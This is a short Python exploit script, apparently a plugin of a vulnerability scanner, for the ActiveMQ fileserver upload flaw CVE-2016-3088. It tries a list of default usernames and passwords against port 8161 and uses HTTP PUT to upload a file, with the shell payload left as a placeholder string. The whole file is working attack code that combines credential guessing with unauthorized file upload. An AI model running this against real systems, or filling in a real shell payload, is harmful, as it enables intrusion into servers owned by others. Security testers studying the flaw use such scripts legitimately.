#!/usr/bin/env python
# coding: utf-8
# Date  : 2025-08-05 14:30
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  : Exploit ActiveMQ file upload vulnerability (CVE-2016-3088)

import base64
import requests
from lib.log import logger
from typing import Optional

def get_auth_header(username: str, password: str) -> str:
    credentials = f"{username}:{password}"
    return f"Basic {base64.b64encode(credentials.encode()).decode()}"

def run(url: str) -> Optional[str]:
    """Exploit ActiveMQ file upload vulnerability (CVE-2016-3088)."""
    # List of users and passwords to try
    users = ["admin", "user", "root"]
    passwords = ["admin", "password", "123456", ""]

    for user in users:
        for pwd in passwords:
            headers = {
                'Authorization': get_auth_header(user, pwd),
            }
            data = "shell code"  # Placeholder for actual shell code
            try:
                logger.info(f"Trying credentials: {user}:{pwd}")
                response = requests.put(
                    f"{url}:8161/fileserver/test.txt", headers=headers, data=data, timeout=5, verify=False
                )
                if response.status_code == 204:
                    logger.success(f"ActiveMQ put file success with {user}:{pwd}")
                    return f"ActiveMQ put file success with {user}:{pwd}"
                logger.warning(f"Failed with {user}:{pwd}, status: {response.status_code}")
            except requests.RequestException as e:
                logger.error(f"Request failed for {user}:{pwd}: {str(e)}")
            except Exception as e:
                logger.error(f"Unexpected error for {user}:{pwd}: {str(e)}")

    logger.warning("No valid credentials found")
    return None
